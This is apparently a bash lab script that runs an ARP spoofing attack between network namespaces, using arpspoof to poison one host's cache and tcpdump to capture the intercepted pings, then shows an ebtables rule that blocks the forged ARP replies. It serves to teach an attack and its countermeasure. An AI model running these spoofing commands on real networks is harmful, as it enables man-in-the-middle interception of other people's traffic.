#!/bin/bash

# Disable job control messages
set -m

# ==============================================
# Starting network setup for ARP Spoofing and Countermeasures
# ==============================================
echo "======================================"
echo "Starting network setup for ARP Spoofing and Countermeasures"
echo "======================================"

# Flush ARP cache
echo "--- Flushing ARP cache on all hosts ---"
ip netns exec h1 ip neigh flush all
ip netns exec h2 ip neigh flush all
ip netns exec h3 ip neigh flush all
ip netns exec h3 ip neigh
echo "ARP cache flushed on h1, h2, and h3."
echo "======================================"

# Pause
read -p "Press Enter to proceed to ARP requests forcing..."

# ==============================================
# Step 1: Force ARP request before checking ARP cache
# ==============================================
echo "======================================"
echo "Step 1: Pinging h1 and h2 from h3 to force ARP requests"
echo "======================================"
ip netns exec h1 ping -c 1 192.168.1.3
ip netns exec h2 ping -c 1 192.168.1.3

# Short sleep to allow ARP cache update
sleep 2

echo "ARP requests forced."
echo "======================================"

# Pause
read -p "Press Enter to verify ARP cache on h3..."

# ==============================================
# Step 2: Verify ARP cache of h3 before attack
# ==============================================
echo "======================================"
echo "Step 2: Verifying ARP cache of h3 before the attack"
echo "======================================"
ip netns exec h3 ip neigh

echo "======================================"

# Pause
read -p "Press Enter to start the ARP Spoofing attack..."

# ==============================================
# Step 3: Perform ARP Spoofing from h1 targeting h3
# ==============================================
echo "======================================"
echo "Step 3: Starting ARP Spoofing attack from h1"
echo "======================================"
ip netns exec h1 arpspoof -i veth1 -t 192.168.1.3 -r 192.168.1.2 > arpspoof_output.log 2>&1 &

# Capture the PID of arpspoof for later use
arpspoof_pid=$!
disown

echo "ARP Spoofing attack started."
echo "======================================"

# Wait for a few seconds to allow the spoofing to take effect
sleep 5

# ==============================================
# Step 4: Check ARP cache of h3 after the attack
# ==============================================
echo "======================================"
echo "Step 4: Checking ARP cache of h3 after the ARP Spoofing attack"
echo "======================================"
ip netns exec h3 ip neigh

echo "======================================"

# Pause
read -p "Press Enter to start monitoring traffic on h1..."

# ==============================================
# Step 5: Monitor traffic intercepted by h1 using tcpdump
# ==============================================
echo "======================================"
echo "Step 5: Monitoring traffic on h1 (attacker)"
echo "======================================"
ip netns exec h1 tcpdump -i veth1 icmp -n -e > h1_tcpdump_during_spoof.txt 2>&1 &
# Capture the PID of tcpdump to stop it later
tcpdump_pid=$!
disown

echo "tcpdump started on h1."
echo "======================================"

# ==============================================
# Step 6: From h3, send ping traffic to h2
# ==============================================
echo "======================================"
echo "Step 6: Sending ping traffic from h3 to h2"
echo "======================================"
ip netns exec h3 ping -c 4 192.168.1.2

echo "Ping traffic sent."
echo "======================================"

# Stop tcpdump after the ping
sleep 1
kill $tcpdump_pid >/dev/null 2>&1

# Display tcpdump output
echo "======================================"
echo "Displaying tcpdump output:"
echo "======================================"
cat h1_tcpdump_during_spoof.txt

echo "======================================"

# Pause
read -p "Press Enter to stop the ARP Spoofing attack..."

# ==============================================
# Step 7: Stop ARP Spoofing attack
# ==============================================
echo "======================================"
echo "Step 7: Stopping the ARP Spoofing attack"
echo "======================================"
kill $arpspoof_pid >/dev/null 2>&1

echo "ARP Spoofing attack stopped."
echo "======================================"

# Wait for a few seconds to ensure the attack is fully stopped
sleep 2

# Pause
read -p "Press Enter to implement ebtables rule for countermeasure..."

# ==============================================
# Step 8: Implement ebtables rule to block ARP replies from h1
# ==============================================
echo "======================================"
echo "Step 8: Implementing ebtables rule to block malicious ARP replies from h1"
echo "======================================"
ebtables -A FORWARD --in-interface fw-v1 --protocol ARP --arp-opcode Reply -j DROP

echo "ebtables rule applied."
echo "======================================"

# Pause
read -p "Press Enter to test ARP Spoofing after applying the rule..."

# ==============================================
# Step 9: Test ARP Spoofing again (should now fail)
# ==============================================
echo "======================================"
echo "Step 9: Testing ARP Spoofing after ebtables rule application (should fail)"
echo "======================================"
ip netns exec h1 arpspoof -i veth1 -t 192.168.1.3 -r 192.168.1.2 > arpspoof_output_blocked.log 2>&1 &

# Capture the PID of the second arpspoof instance
arpspoof_pid_2=$!
disown

echo "ARP Spoofing (expected to fail) started."
echo "======================================"

# Wait for a few seconds to confirm the attack failure
sleep 5

# ==============================================
# Step 10: Check ARP cache again to confirm it was not poisoned
# ==============================================
echo "======================================"
echo "Step 10: Checking ARP cache of h3 after blocking ARP Spoofing"
echo "======================================"
ip netns exec h3 ip neigh

echo "======================================"

# Pause
read -p "Press Enter to clean up ebtables rule and finalize..."

# ==============================================
# Step 11: Cleanup the ebtables rule
# ==============================================
echo "======================================"
echo "Step 11: Cleaning up the ebtables rule"
echo "======================================"
ebtables -D FORWARD --in-interface fw-v1 --protocol ARP --arp-opcode Reply -j DROP

echo "ebtables rule removed."
echo "======================================"

# ==============================================
# Step 12: Stop all background processes
# ==============================================
echo "======================================"
echo "Step 12: Stopping all remaining background processes"
echo "======================================"
kill $arpspoof_pid_2 >/dev/null 2>&1

echo "All background processes stopped."
echo "======================================"

# ==============================================
# Final Outputs
# ==============================================
echo "======================================"
echo "Displaying ARP Spoofing output from the first attack:"
echo "======================================"
cat arpspoof_output.log

echo "======================================"
echo "Displaying ARP Spoofing output from the blocked attack:"
echo "======================================"
cat arpspoof_output_blocked.log

echo "======================================"
echo "Network setup, ARP Spoofing, and countermeasure tests completed."
echo "======================================"

